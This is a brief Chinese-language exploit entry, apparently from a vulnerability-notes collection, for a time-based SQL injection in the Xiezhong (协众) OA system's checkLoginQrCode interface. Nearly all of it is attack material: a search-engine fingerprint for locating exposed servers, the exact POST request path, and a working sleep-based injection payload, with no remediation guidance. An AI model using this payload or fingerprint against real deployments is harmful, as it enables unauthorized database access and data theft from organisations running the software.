# 协众OA系统接口checkLoginQrCode存在SQL注入漏洞

协众OA系统接口 ｜ SQL注入 ｜ —
- **指纹**：`app="协众软件-协众OA"`
- **请求**：`POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1`

**Payload**
```
id=(select * from (select sleep(5))z)
```
- **响应特征**：200